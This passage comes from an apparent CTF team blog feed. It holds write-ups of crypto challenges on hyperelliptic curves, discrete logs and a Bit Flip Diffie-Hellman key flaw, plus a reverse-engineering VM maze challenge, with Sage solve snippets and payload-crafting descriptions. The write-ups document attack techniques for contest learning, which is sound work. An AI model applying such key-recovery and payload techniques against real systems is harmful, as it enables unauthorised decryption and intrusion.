modu == 6: kth_root = 2 else: kth_root = 0 #Calculate rest of jacobi sum if genus == 2: temp_array[0] = a*a temp_array[1] = -a temp_array[2] = 0 temp_array[3] = -a temp_array[4] = 1 else: temp_array[0] = a*a*a temp_array[1] = -a*a temp_array[2] = a temp_array[3] = -1 temp_array[4] = -a*a temp_array[5] = a - (a*a) temp_array[6] = a #Now multiply by kth_root for i in range(n): index = (abs(kth_root) + i) % n jacobi[index] = temp_array[i] if kth_root \u0026lt; 0: jacobi[index] *= -1 return jacobi def evaluateOrderTwists(jacobi, i, j, n): twist = 0 order = [None] * (n - 1) roots_unity = [None] * n #Calculate roots of unity that are needed roots_unity[0] = 1 for k in range(1, n): real_part = cos((2*k*pi)/n) imag_part = sin((2*k*pi)/n) roots_unity[k] = real_part + imag_part*I #Add in the \u0026#34;twist\u0026#34; to the jacobi sum twist = pow(-1, i) jacobi[j] = jacobi[j] + twist; print(\u0026#34;twist: \u0026#34; + str(twist)) order[0] = 0 #Evaluate first iteration for k in range(n): order[0] += (jacobi[k] * roots_unity[k]) #Evaluate norm of jacobi sum (and twist) for k in range(2, n): jac2 = [None] * n index = 0 jac2[0] = jacobi[0] #Bump all the roots of unity up by the \u0026#34;k-th\u0026#34; power for l in range(1, n): index = (l * k) % n jac2[index] = jacobi[l] order[k-1] = 0 #Evaluate k-th iteration for l in range(n): order[k-1] += (jac2[l] * roots_unity[l]) #Find the total order of the jacobian total_order = order[0] * order[1] * order[2] * order[3] return total_order.real() def data_to_jacobian(data): u, v = data[0], data[1] u = sum([u[i] * x^i for i in range(3)]) v = sum([v[i] * x^i for i in range(2)]) return J((u, v)) a = 1152921504606846997 g = 2 n = 5 e = 2873198723981729878912739 jacobi = calculateJacobiSum(a, g, n) #order = evaluateOrderTwists(jacobi, 0, 1, n).n(digits=200) order = 3121748550315992691688089417819100427615767189940196696753029154066816327228360361217733781238925753559457441594415001909435541252098381221684880 alpha = 1532495540865888942099710761600010701873734514703868973 p = alien_prime(a) FF = FiniteField(p) R.\u0026lt;x\u0026gt; = PolynomialRing(FF) C = HyperellipticCurve(alpha*x^5,1,\u0026#39;u,v\u0026#39;) J = C.jacobian() J = J(J.base_ring()) enc_flag = ([1276176453394706789434191960452761709509855370032312388696448886635083641, 989985690717445420998028698274140944147124715646744049560278470410306181, 1], [617662980003970124116899302233508481684830798429115930236899695789143420, 429111447857534151381555500502858912072308212835753316491912322925110307]) inv = inverse_mod(e, order) J_point = data_to_jacobian(enc_flag) flag_point = inv*J_point flag_int = flag_point[0].coefficients()[0] print(-flag_int % p) Flag: CHTB{hyp3r_sp33d_c0unting!!}\nWho need maths if you can OSINT?\n  Colm Ó hÉigeartaigh (2004) \u0026quot;A Comparison of Point Counting methods for Hyperelliptic Curves over Prime Fields and Fields of Characteristic 2\u0026quot;\nhttps://eprint.iacr.org/2004/241.pdf [return] Colm Ó hÉigeartaigh (2004) \u0026quot;Hyperelliptic Curve Cryptographic Software\u0026quot; (Invalid)\nhttp://www.computing.dcu.ie/~coheigeartaigh/crypto.html [return] Colm Ó hÉigeartaigh (2004) \u0026quot;Hyperelliptic Curve Cryptographic Software\u0026quot;\nhttps://web.archive.org/web/20050924125637/http://www.computing.dcu.ie/~coheigeartaigh/crypto.html [return]   ","permalink":"https://b6a.black/posts/2021-04-25-htbctf-crypto/","summary":"We played Cyber Apocalypse 2021 and I have attempted several crypto challenges. I'll include the challenges Wii Phit and Hyper Metroid in this writeup.","title":"Cyber Apocalypse 2021: Wii Phit \u0026 Hyper Metroid"},{"content":"Challenge Summary Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points).\n Your eyes are like a maze, and I hate mazes, so help me escape.\n We are given a binary which takes an input and outputs either :) or :(. If you win a smiley face on the remote server, you are additionally given the flag.\nSolution This challenge is solved by harrier in collaboration with Mystiz. The solution is written in the prespective of harrier.\nPart I: Reversing the virtual machine Since this is a reverse question with a binary, I decided to open it with IDA. This is a simple VM-type binary, with the instruction code stored directly inside.\nIt looked so simple to me at the beginning, and I wonder why no one has solved it? After a bit of reversing and dynamically debugging, I know I was wrong.\nThe code of the binary itself is simple. It is a simple VM with the below variables\n Eight one-byte state registers ($R_0, R_1, \u0026hellip;, R_7$), a two-byte instruction pointer ($p$), an one-byte direction register ($d=1, 2, 3, 4$) deciding how the instruction pointer move, an one-byte select register ($k$) deciding the index of register for subsequent operations, and 65536 one-byte memory ($M_0, M_1, \u0026hellip;, M_{65535}$) storing the instructions and data.  Moreover, each byte in the memory represents an instruction, and the instruction set is defined below.\n   Value Operation     0 do nothing   1 - 8 $k \\leftarrow 0$, \u0026hellip;, $k \\leftarrow 7$   9 - 16 $R_k \\leftarrow R_0$, \u0026hellip;, $R_k \\leftarrow R_7$   17 $R_k \\leftarrow R_k + 1$   18 $R_k \\leftarrow R_k - 1$   19 $R_k \\leftarrow R_6 + R_7$   20 $R_k \\leftarrow R_6 - R_7$   21 $R_k \\leftarrow R_6 \\times R_7$   22 $R_k \\leftarrow \\text{floor}(R_6 / R_7)$   23 $R_k \\leftarrow R_6\\ \\text{mod}\\ R_7$   24 $R_k \\leftarrow \\text{~}R_k$   25 $R_k \\leftarrow -R_k$   26 $R_k \\leftarrow R_6\\ \\text{and}\\ R_7$   27 $R_k \\leftarrow R_6\\ \\text{or}\\ R_7$   28 $R_k \\leftarrow R_6\\ \\text{xor}\\ R_7$   29 $R_k \\leftarrow R_6 == R_7$   30 $R_k \\leftarrow R_6 \u0026lt; R_7$   31 $256R_0+R_1 \\leftarrow p, R_2 \\leftarrow d$   32 keycheck   33 $R_k \\leftarrow M_{256R_0 + R_1}$   34 $M_{256R_0 + R_1} \\leftarrow R_k$   35 $p \\leftarrow 256R_0 + R_1, d \\leftarrow R_2$   36 $R_k \\leftarrow \\text{input}$   37 $\\text{print}\\ R_k$   38 - 41 $d \\leftarrow 1$, \u0026hellip;, $d \\leftarrow 4$    Keycheck is the only curious instruction, where I don\u0026rsquo;t really know why it even exists. While I was reversing, I am only able to realize it is used perform some fatal checks.\nPart II: Building an emulator As the VM code is so simple, I decided to write an emulator in Python for ease of testing. It is not hard to write an emulation given that I have fully reversed the VM.\nSince the instruction code is embedded in the binary, I used gef to extract the code part, and while in emulation I translate the code to human (me) readable instruction for further reverse. I thought I could get the flag by just reading and parsing the translated code, and figuring out the whole logic. I was wrong and it was far more complicated than that.\nWith the emulator I was able to produce some code trace with various input, here\u0026rsquo;s some debug log I generated, with state of the VM and instruction it ran:\nCurrent state: [0, 46, 1, 22, 41, 35, 23, 0] 6 50 / 16 0 50/16 REGSEL = 6 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 6 49 / 16 0 49/16 LOAD REG[6] 0/46 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 48 / 16 0 48/16 REGSEL = 7 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 47 / 16 0 47/16 REG[7] = REG[6] == REG[7] Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 16 0 46/16 KEYCHECK REG[7] OK Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 16 3 45/16 SETMODE 3 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 45 / 15 2 45/15 SETMODE 2 Current state: [0, 46, 1, 22, 41, 35, 24, 0] 7 46 / 15 2 47/15 REG[7] = REG[4] a/b is the notation I used to express instruction pointers, hereby $p = 256a + b$.\nI yield thousands of debug lines like the one above, and I tried to reverse the input process logic, and I realize there is a loop to detect what is my input, and it loop through to see whether the input matched those in the accepted characters.\nHow the characters are matched? Only here I realize the meaning of the keycheck operation. It is simply an if: If the condition holds, the instruction pointer will move two steps forward. Otherwise it will move only one.\nAlso, I was able to generate a list of possible inputs for the first byte, but then I was stuck and didn\u0026rsquo;t know how to do.\nPart III: Visualizing the inner program This part is written in the prespective of Mystiz.\nI decided to join harrier on this challenge at some point of time. At that moment, he have reversed all of the VM and part of the inner program. I want to know what proportation of the inner program he has reversed.\nAt first, I tried to use graphviz for visualization. The results are pretty dull, and most nodes have both the in-degrees and out-degrees being one.\nThis is not surprising, since the nodes have out-degrees larger than one only if they are branches. However, one interesting point from this is, in most of the time, if x1/y1 transits to x2/y2, then $|x_1-x_2|+|y_1+y_2|=1$\u0026hellip; Sounds like they are transited to adjacent grids in each instruction. I recalled some esolangs like Piet and Befunge, where the instruction pointers are actually 2D-coordinates. Although they are not equal, I had an idea to transform the whole thing into a two-dimensional grid. Well, maybe I should use HTML tables to visualize this. Since harrier is tracing the instructions executed, I can integrate it and generate a heatmap to check what is being covered.\nWow, this is pretty impressive. Now we can see that only a small proportion of the code in the inner program is visited. One thing that caught our attention is the maze on the top-left corner. Well, it seemed impossible for us to traverse inside the maze, since there are no arrows and we are very likely unable to turn without arrows.\nWe are able to identify a few zones inside the internal program:\n Request for input Payload area Loop structure The failing and the winning gadgets Maze  Part IV: Generating random ideas While testing with random inputs, it seemed that the input will be filling in 35/22, 35/23 and etc.\nMy first idea is to see whether if we can overwrite 35/1 by overflowing the input buffer. I was expecting that the original code can be corrupted by writing up to 35/255, then it will be wrapped back to 35/0 and 35/1. Turns out this is not possible since only the bottom right zone, with dimensions $47\\times34$, could be overwritten, filling line by line. The excessive input will simply be ignored.\nFrom the visualization, we can see that there are several print gadgets. For example, there is a failing gadget (which prints :() on the bottom left input part that will be traversed when a character outside the character set is given. There is also one on the upper middle of the map and one in the top right. Mystiz has identified that the former one has the same instructions as the one on the bottom left, so it would also be a failing gadget. The objective is simple: To make the instruction pointer end up on the top-right part, on the winning gadget.\nTo achieve this, one idea we had is to find ways to jump to the winning gadget directly. We found that the instruction pointer will be moving into the payload area when we are given a sufficiently long input. Therefore we can actually execute the payloads we sent.\nKnowing that, we tried to use the set address instruction (byte 0x23) to jump to the win widget. Unfortunately this does not work, since 0x23 is not allowed as an input.\nWe then come up an idea to try to use the conditional keycheck operation on the side of the square to escape out of the box. However keycheck does not allow an arrow pointing to itself. This does not work as well.\nIt seems that the only possible way is to navigate in the maze properly to get to the win gadget. But how is it possible if the maze do not have arrows?\nWell, there is an untouched part of the program - the arrow-putting gadget. With $R_4 \u0026lt; 4$, it can be used to put arrows on to the maze with the set register instruction (byte 0x21). We reversed it and and expected that it behaves as the following Python code snippet:\nfor x in range(1, 21): for y in range(1, 21): # We are not allowed to overwrite the \u0026#34;load address\u0026#34; instructions # i.e., the walls. if M[256*x + y] == 0x23: continue if R[4] \u0026lt; 4: M[256 * x + y] = 0x26 + R[4] # 0x26 0x27 0x28 0x29 # ↑ → ↓ ← Our objective is updated once again. Now the goal is to craft a payload to put appropriate arrows to let us navigate through the maze.\nBut wait, there is a check after the maze. Basically, there are some instructions in the maze to write $R_3, R_4, R_5$ and $R_7$. All we need to do is to walk through the maze in a specific order to pass the check.\nSo we finally have a clear target: design a route for the maze to pass through all the checks and get to the winning gadget.\nPart V: Crafting a smiley face In each iteration, I can control 8 registers, initially with $R_0 = 0, R_1 = 5, R_6 = x$ and $R_7 = y$. Initially, I copied the coordinates by $R_2 \\leftarrow x$ and $R_3 \\leftarrow y$ for further operations. Moreover, $R_0$ and $R_1$ can be used to build up to an arbitrary number in a few instructions.\nThe idea is to encode few arrows into a vertical block.\nHowever, the size of our input is pretty small. We need to make use of some techniques to save space. For instance, we can encode few arrows into one condition (Instead of checking x == x0 and y == y0, we can use y \u0026gt; y0, y mod 6 or even x == y as long as it traverses to the goal).\nWriting the payload is tiring without some auxiliary tools, so I used spreadsheet to write the instructions and wrote a simple CSV parser to convert those instruction to the input payload. After some unknown hours of manual work, I have eventually crafted the payload. This is how it looks in spreadsheet. 🙈\nIt is then converted as a payload to the binary. This is the emulated result that eventually returns a smiley face.\nPart VI: Final thoughts It was really a fun reverse challenge, while being easy to begin yet challenging to finish. Every part of the challenge is well-designed. The maze, the constraints, and even the instructions that making this challenge to work. That was an exciting and mind-blowing experience to explore and dig into rabbit holes of the challenge bit by bit.\nThanks to Mystiz for the great insights and the visualization, I think having the visualization itself is already having half of the challenge solved. 😀\n","permalink":"https://b6a.black/posts/2021-02-09-dicectf-liye/","summary":"Lost in Your Eyes is a reverse engineering challenge in DiceCTF 2021 with ten solves (334 points). We are given a binary which takes an input and outputs either :) or :(. If you win a smiley face on the remote server, you are additionally given the flag.","title":"DiceCTF 2021: Lost in your Eyes"},{"content":"TetCTF is the first CTF I have played in 2021. I recalled from last year that they have cool challenges. This year, there are three crypto challenges. In particular, unevaluated is the hardest among them. Although I did not solve them, I dug into rabbit holes and had a lot of struggle, uh, fun.\nChallenge Summary There is a 128-bit prime $p$. Define $\\cdot: \\mathbb{Z}_{p^2}^2\\times\\mathbb{Z}_{p^2}^2\\rightarrow\\mathbb{Z}_{p^2}^2$ by\n\\[(x_1, y_1)\\cdot(x_2, y_2) := \\left(\\left(x_1x_2-y_1y_2\\right)\\ \\text{mod}\\ p^2, \\left(x_1y_2+y_1x_2\\right)\\ \\text{mod}\\ p^2\\right),\\]\nwhere $(x_1, y_1), (x_2, y_2) \\in \\mathbb{Z}_{p^2}^2$. Also, define for $k\\in\\mathbb{N}$ and $G \\in \\mathbb{Z}_{p^2}^2$, $G^k = G \\cdot G \\cdot ... \\cdot G$. Given that $G, H \\in \\mathbb{Z}_{p^2}^2$, the objective is to find $k\\in\\mathbb{N}\\cap\\left[0, 2^{256}\\right)$ such that $H = G^k$.\nSolution Clickbaited! This writeup is not original and has referred (or stolen) to several sources (Thanks rkm0959 and CryptoHack!). I would like to write this up for my own reference. Anyway, this is more like a story than a solution.  Part I: What is the order composed of? Since $p$ and $k$ are respectively 128 and 256 bits long, it is expected to recover two out of $k\\ \\text{mod}\\ p$, $k\\ \\text{mod}\\ q$ and $k\\ \\text{mod}\\ r$ to compute $k$. It is interesting to see the order being a product of three primes $p, q, r$, with $q | (p-1)$ and $r | (p+1)$.\nI have defined $\\text{norm}: \\mathbb{Z}_{p^2}^2 \\rightarrow \\mathbb{Z}_{p^2}$ by $\\text{norm}(x, y) = (x^2 + y^2)\\ \\text{mod}\\ p^2$ and experimented a bit and discovered some of the properties:\n The imaginary part of $G^{pr}$ is zero. $\\text{norm}(G^{pq}) = 1$, and  If we are working on $\\mathbb{Z}_p$ instead of $\\mathbb{Z}_{p^2}^2$, then\n The imaginary part of $G^r$ is zero. $\\text{norm}(G^q) = 1$, and  The following code snipped is used to verify the above properties.\n# Under mod n P = complex_pow(G, p*r, n) # P.im == 0 dQ = norm(complex_pow(G, p*q, n), n) # dQ == 1 # Under mod p P = complex_pow(G, r, p) # P.im == 0 dQ = norm(complex_pow(G, q, p), p) # dQ == 1 This make me think: If we consider a polar coordinate representation where $G = \\rho e^{i\\theta}$, with $\\rho\\in R$ and $\\theta\\in A$, then $R \\cong \\mathbb{Z}_{pq}$ and $A \\cong \\mathbb{Z}_{pr}$. Hence, we can imagine that the subgroup that $G$ generates is isomorphic to $\\mathbb{Z}_{pq}\\times\\mathbb{Z}_{pr}$.\nWell, they are not important though. This is interesting however.  Part II: Stealing the ideas from an existing cryptosystem Solving discrete log under modulo $n^2$ does not seem difficult. For example, we can see from Paillier cryptosystem that discrete logarithms under modulo $n^2$ can be computed easily. In this way, we can compute $x\\ \\text{mod}\\ p$ with:\n\\[x \\equiv \\frac{\\mathcal{L}(h^{p-1}\\ \\text{mod}\\ p^2)}{\\mathcal{L}(g^{p-1}\\ \\text{mod}\\ p^2)}\\ (\\text{mod}\\ p),\\]\nwhere $\\mathcal{L}(x) = \\frac{x-1}{p}$, like how a ciphertext is decrypted with the Paillier cryptosystem. Hence we have $x\\ \\text{mod}\\ p$.\nMini Checklist\n $x\\ \\text{mod}\\ p$ $x\\ \\text{mod}\\ q$ $x\\ \\text{mod}\\ r$   Part III: Solving 128-bit discrete logarithm Let's try to work on $\\mathbb{Z}_{p}^2$ instead of $\\mathbb{Z}_{p^2}^2$. This reminded me the challenge galiver in ASIS CTF Finals 2020. I searched the discussion on CryptoHack's Discord server, and found...\nhellman's comment on galiver back then.  Okay, works for 128-bit $p$ rather fast. So this must be discrete logarithm. Let's try it? Since the imaginary part for $G^r, H^r$ are zero, I tried discrete_log(H^r, G^r, q) on Sage. After five minutes, my PC crashed. I could not solve it during the CTF. After the game, rkm0959 publishes the writeup on the CTF and he used h.log(g) and have got it working. In his writeup, he uses a norm map which is isomorphic to the subgroup that $G^r$ generates.\np = 206109322179011817882783419945552366363 q = 103054661089505908941391709972776183181 r = 17175776848250984823565284995462697197 G = (20878314020629522511110696411629430299663617500650083274468525283663940214962, 16739915489749335460111660035712237713219278122190661324570170645550234520364) H = (11048898386036746197306883207419421777457078734258168057000593553461884996107, 34230477038891719323025391618998268890391645779869016241994899690290519616973) Zp = GF(p) g = Zp(G[0]**2 + G[1]**2) # equivalently, g = Zp(complex_pow(G, r, p).re) h = Zp(H[0]**2 + H[1]**2) # and h = Zp(complex_pow(H, r, p).re) assert g^q == 1 x_mod_q = h.log(g) print(\u0026#39;x % q =\u0026#39;, x_mod_q) # 26176203815975575469683683780455489251 Takeaway. Sage is powerful. It tooks 3 minutes for my PC to compute the discrete log, where the time complexity should be $\\mathcal{O}(\\sqrt{q})$. Also, do not use discrete_log(h, g). Use h.log(g) instead.  Mini Checklist\n $x\\ \\text{mod}\\ p$ $x\\ \\text{mod}\\ q$ $x\\ \\text{mod}\\ r$   Part IV: Combining the building blocks With Chinese remainder theorem, we are able to recover $x_0 := x\\ \\text{mod}\\ pq$. It may not equal to $x$, but they are differ from a small multiple of $pq$. We can simply compute $x_0 + kpq$ for some small $k\\in\\mathbb{N}$ until $k$ is obtained. After that we have the flag - TetCTF{h0m0m0rph1sm_1s_0ur_fr13nd-mobi:*100*231199111007#}. This challenge makes me think more about discrete logarithm, and I am amazed by the capability of Sage. I am still wondering why discrete logarithm of a 128-bit prime can be computed in just a few minutes...\n","permalink":"https://b6a.black/posts/2021-01-03-tetctf-unevaluated/","summary":"TetCTF is the first CTF I have played in 2021. I recalled from last year that they have cool challenges. This year, there are three crypto challenges. In particular, unevaluated is the hardest among them. Although I did not solve them, I dug into rabbit holes and had a lot of struggle, uh, fun.\nChallenge Summary There is a 128-bit prime $p$. Define $\\cdot: \\mathbb{Z}_{p^2}^2\\times\\mathbb{Z}_{p^2}^2\\rightarrow\\mathbb{Z}_{p^2}^2$ by\n\\[(x_1, y_1)\\cdot(x_2, y_2) := \\left(\\left(x_1x_2-y_1y_2\\right)\\ \\text{mod}\\ p^2, \\left(x_1y_2+y_1x_2\\right)\\ \\text{mod}\\ p^2\\right),\\]","title":"TetCTF 2021: unevaluated"},{"content":"I was teamed up to play hxp CTF as @blackb6a last week. The hxp team had come up with a collection of hard challenges. In particular, there are two series of crypto challenges with a total of five parts. I will be writing on the hyper challenge and some follow-up and unanswered questions regarding to hyperelliptic curves.\nⓘ 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝘀𝗼𝘂𝗿𝗰𝗲𝘀 𝘀𝘁𝗮𝘁𝗲𝗱 𝘁𝗵𝗮𝘁 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗺𝗶𝘀𝗹𝗲𝗮𝗱𝗶𝗻𝗴\nSeriously. I knew nothing on hyperelliptic curves prior to the CTF. The writeup is solely based on what I learnt during the game, and may not be accurate. If you found a mistake, please do not hesitate to contact me. Many thanks! :smile:\n Challenge Summary In this series of challenge, the message Hello! The flag is: hxp{...} is xorred with an bytestream generated by an PRNG. In particular, the only difference between hyper (crypto, 294 points) and hyperhyper (crypto, 714 points) is the message lengths, respectively 45 and 93.\nWithout doubt, the most crucial element for this challenge is the PRNG, which is based on Jacobian of hyperelliptic curves. In this challenge, the Jacobian $\\mathcal{J}$ of a hyperelliptic curve $\\mathcal{H}$ of genus 3 over $\\mathbb{Z}_p$ is used. $\\mathcal{H}$ is defined by:\n\\[\\mathcal{H}: y^2 \\equiv x^7 + x\\ (\\text{mod}\\ p).\\]\nThree constant points $G_1, G_2, G_3$ from $\\mathcal{J}$ are picked and three integers $k_1, k_2, k_3$ are picked randomly as the seed. Finally, define $H_n \\in \\mathcal{J}$ by $H_n := k_1^nG_1 + k_2^nG_2 + k_3^nG_3$ for $n\\in\\mathbb{N}$. If we write $H_n = \\left(u_n\\left(x\\right), v_n\\left(x\\right)\\right)$, where\n\\[\\begin{cases} u_n(x) := u_{n0} + u_{n1} x + u_{n2} x^2 + u_{n3} x^3 \\\\ v_n(x) := v_{n0} + v_{n1} x + v_{n2} x^2 \\end{cases},\\]\nthen the random stream would be $(u_{10}, u_{11}, u_{12}, v_{10}, v_{11}, v_{12}, u_{20}, u_{21}, ...)$, where each of $u_{ij}$ and $v_{ij}$'s is of 8 bytes.\nSolution Part I: Comparing hyper and hyperhyper One thing that made me very curious at first glance: We are given 24 bytes of the random bytestream from the known message in both hyper and hyperhyper, why is hyperhyper an independent question? If we are able to recover internal state for the PRNG, wouldn't it be evident to solve the both parts?\nOf course, I would have not questions if I have understood the PRNG. Since the first 24 bytes are known, we have $u_1(x)$. For hyper, we gotta recover the following 21 bytes, which is enough by recovering $v_1(x)$. After all, the points are given in Mumford representation. With that said, if a point $P\\left(u\\left(x\\right), v\\left(x\\right)\\right)\\in\\mathcal{J}$, the below properties are satisfied1:\n  $u(x)$ is monic, $f(x) \\equiv [v(x)]^2\\ \\left(\\text{mod}\\ u\\left(x\\right)\\right)$, and $\\deg\\left(v\\left(x\\right)\\right) \u0026lt; \\deg\\left(u\\left(x\\right)\\right) \\leq 3$.   It is hinted from the second property that the objective is to find a modular square root for $f(x)$ under modulo $u(x)$.\nPart II: Midnight thoughts It was midnight when I realize this and I could not immediately think of an appropriate approach. I was even once expanding everything:\nSuppose that we have $u(x) := x^3 + rx^2 + sx + t$ and $v(x) := ax^2 + bx + c$. Then the following modular congruences hold:\n\\[\\begin{cases} -r^5 + 4r^3s - 3r^2t - 3rs^2 + 2st - a^2r^2 + 2abr + a^2s - 2ac - b^2 \\equiv 0 \\\\ -r^4s + 3r^2s^2 - 4rst - s^3 + r^3t + t^2 + 1 - a^2rs + 2abs + a^2t - 2bc \\equiv 0 \\\\ -r^4t + 3r^2st - 2rt^2 - s^2t - a^2rt + 2abt - c^2 \\equiv 0 \\end{cases}(\\text{mod}\\ p).\\]\nI must be very sleepy back then.\nPart III: Wake up, wake up! After [enter an arbitrary number] hours of sleep, I woke up and immediately recalled Tonelli-Shanks algorithm. Basically we are able to apply the algorithm to compute modular square root, even with modulo $u(x)$. Since $u(x)$ is a degree 3 polynomial over $\\mathbb{Z}_p$, the order for $\\mathcal{G} := \\text{GF}(p)[x]/u(x)$ would be a factor of $p^3 - 1$. Knowing the order, we can apply Tonelli-Shanks to compute a modular square root for $f(x)$. After all, $v(x)$ would be one of them.\nThe rest is trivial after we have $v_1(x)$ computed. Xorring the output with the keystream, we have the message: Hello! The flag is: hxp{ez_P4rT_i5_ez__tL0Cm}.\nPart IV: Mysteries of hyperelliptic curves I am not going to talk about solutions anymore. This section contains a list of unproved properties which looked truthy for me. Those questions came to my mind while attempting hyperhyper, while I have no proofs. The questions are no means useful for solving the questions, but I think they are helpful in pairing-based cryptography. They are very likely used somewhere anyway.  Let $\\mathcal{J}$ be the Jacobian of a hyperelliptic curve of genus 3. Suppose that $\\sigma$ is the order of $G_1, G_2, G_3\\in\\mathcal{J}$.\n Question 1. Is $a_1G_1 + a_2G_2 + a_3G_3$ also has an order $\\sigma$ given that $gcd(a_i, \\sigma)=1$? Question 2. Define $S := \\{k_1G_1 + k_2G_2 + k_3G_3 \\in \\mathcal{J}: k_1, k_2, k_3\\in\\mathbb{Z}\\}$. Is $\\left|S\\right| = \\sigma^3$? Question 3. Let $(\\mathbb{Z}_p^3, +)$ be a group and define $x = (x_1, x_2, x_3), y = (y_1, y_2, y_3) \\in\\mathbb{Z}_p^3$. Suppose $x+y = (x_1+y_1, x_2+y_2, x_3+y_3)$. Is $(\\mathbb{Z}_p^3, +)$ isomorphic to $S$?    Jasper Scholten, Frederik Vercauteren (2003). \u0026quot;An Introduction to Elliptic and Hyperelliptic Curve Cryptography and the NTRU Cryptosystem\u0026quot;\nhttps://homes.esat.kuleuven.be/~fvercaut/papers/cc03.pdf [return]   ","permalink":"https://b6a.black/posts/2020-12-20-hxpctf-hyper/","summary":"I was teamed up to play hxp CTF as @blackb6a last week. The hxp team had come up with a collection of hard challenges. In particular, there are two series of crypto challenges with a total of five parts. I will be writing on the hyper challenge and some follow-up and unanswered questions regarding to hyperelliptic curves.\nⓘ 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝘀𝗼𝘂𝗿𝗰𝗲𝘀 𝘀𝘁𝗮𝘁𝗲𝗱 𝘁𝗵𝗮𝘁 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗺𝗶𝘀𝗹𝗲𝗮𝗱𝗶𝗻𝗴\nSeriously. I knew nothing on hyperelliptic curves prior to the CTF.","title":"hxp CTF 2020: Hyper"},{"content":"Dragon CTF 2020 is definitely had my best CTF moments. There are big brain moments and I have been mind-blown for multiple times during the game. This time we have teamed up with @blackb6a. I have solved all the crypto challenges and two challenges with my teammates.\nThere are three challenges writeup in this post:\n Bit Flip (parts 2 and 3) Frying in motion babykok  Bit Flip (Crypto, 155+324+343 points) Solved by Mystiz.\nChallenge Summary At the beginning, a 128-bit alice_secret (denoted as $a$) is generated. We are given an oracle that allows us to input a 256-bit value $v$. An PRNG $R$ uses $a\\oplus v$ to derive:\n a 512-bit prime $p$ that is used for Diffie-Hellman, and a 64-bit secret $a$ that is Alice's secret key.  For each oracle call, the following will be printed\n The number of rng.getbits(512) calls for $p$ to be a prime, Bob's public key (which is generated randomly in each call), $B$, The encrypted flag (with AES-CBC \u0026amp; key is derived from the DH shared key):  Of course, the devil is in the detail. The AES-CBC key is derived as follows:\ndh_shared_key = 1337 ^ pow(B, a, p) key = long_to_bytes(dh_shared_key, 16)[:16] Furthermore, the PRNG is simple. It is maintaining a 256-bit state $s$. 512-bit and 64-bit numbers are generated respectively with:\ndef getbits(bits=512): output = sha256(long_to_bytes(s, 32)).digest() + sha256(long_to_bytes(s+1, 32)).digest() s += 2 return output def getbits(bits=64): output = sha256(long_to_bytes(s, 32)).digest()[-8:] s += 1 return output The plot twist This is the setting for part one. Parts two and three are pretty similar though.\n Parts 2 and 3 are not returning Bob's public key, and Part 3 uses the prime $p$ and check if $q := 2p+1$ is a prime. The prime $q$ (instead of $p$) is used for DH.  Solution Part I: The real bit-flipping Bit Flip 1 was solved in about 45 minutes. Basically we are able to recover $v$ from the number of rng.getbits(512) calls. Since I am sure that there will be writeups on this part available online, I am skipping this part.\nI am just going to admit that I am lazy.  Part II: A nightmare on long_to_bytes Bit Flip 3 was solved in 1 hour - and we were the first to solve. But wait, why isn't part II on Bit Flip 2? The reason is simply because just I cannot solve it (yet).\ndefund had the same question, too.  The prime used for Diffie-Hellman can be 513-bit long. This makes the AES key derivation interesting - as long_to_bytes(x, 16) actually prepend null bytes until the output size is a multiple of 16. For example:\n\u0026gt;\u0026gt;\u0026gt; long_to_bytes(2**127, 16).hex() \u0026#39;80000000000000000000000000000000\u0026#39; \u0026gt;\u0026gt;\u0026gt; long_to_bytes(2**128, 16).hex() \u0026#39;0000000000000000000000000000000100000000000000000000000000000000\u0026#39; Luckily (or unluckily) the shared key can be as large as 513 bits long. In that case, the first block would be 00 00 ... 00 00 01 - and this is the AES key.\nWe do not even need to know Alice's nor Bob's key. Basically there is around 25% chance for the DH shared key to be 513-bit. When it happens, the constant key is used and we are able to decrypt the flag - DrgnS{C0nst_A3S_K3y_1111111111111!}. First blood 🩸!\nPart III: Playing mind-games on Bit Flip 2 Bit Flip 2 was solved in about 12 hours. I was mind-blown when I know da wae. Since the DH key could never be 513 bits long anymore, we can no longer exploit in the way as described in Bit Flip 3.\nWait. This made me very puzzled: How do we find the shared key (or $g^{ab}\\ (\\text{mod}\\ p)$) if Bob is not telling us anything?  Basically we have three options:\n Make $a = 0$. This implies that $g^{ab} \\equiv 1$, resulting in a constant key. Find $a$ and $p$ such that $g^a\\in\\mathbb{Z}_p^*$ has a small order. Hence $\\{g^{ab}\\in\\mathbb{Z}_p^*\\ |\\ b\\in\\mathbb{Z}\\}$ can be exhausted feasibly. Make $p$ 385-bit long (or 1-bit, 129-bit or 257-bit). Then we are able to reuse the exploit on Bit Flip 3.  There is a point of time that over 10 teams have solved Bit Flip 2 while only hxp and us have solved Bit Flip 3. If option 3 is the way to go, the number of solves would not be the same. Moreover, option 2 is barely possible in a perspective of math. That said, unless there is a vulnerability that I am not awared of, we may need to make $a = 0$. That is equivalent to rng.getbits(64) == 0 and thus a 64-bit proof-of-work. Possible?\nDuring the research, I was wondering if there is a proof-of-work database that has a list of payloads with many trailing zeros as its hash. I was even wondering if there is someone ever able to solve a 64-bit proof-of-work (particularly on SHA256). Turns out I am too naive - some are able to solve a 76-bit proof-of-work in around 10 minutes. Who? The bitcoin network.\nLet's appreciate the number of zeros...  The block hashing algorithm for Bitcoin is SHA256. This is how block 125552 (the smallest hash as of June 2011) is computed:\nd = bytes.fromhex(\u0026#39;0100000081cd02ab7e569e8bcd9317e2fe99f2de44d49ab2b8851ba4a30\u0026#39; + \u0026#39;8000000000000e320b6c2fffc8d750423db8b1eb942ae710e951ed797f7\u0026#39; + \u0026#39;affc8892b0f1fc122bc7f5d74df2b9441a42a14695\u0026#39;) m = hashlib.sha256(d).digest() print(m.hex()) # b9d751533593ac10cdfb7b8e03cad8babc67d8eaeac0a3699b82857dacac9390 h = hashlib.sha256(m).digest() print(h.hex()) # 1dbd981fe6985776b644b173a4d0385ddc1aa2a829688d1e0000000000000000 The above hash ends with 8 null bytes. If the below seed generates a prime in its first call of rng.getbits(512), then a = 0:\nseed = 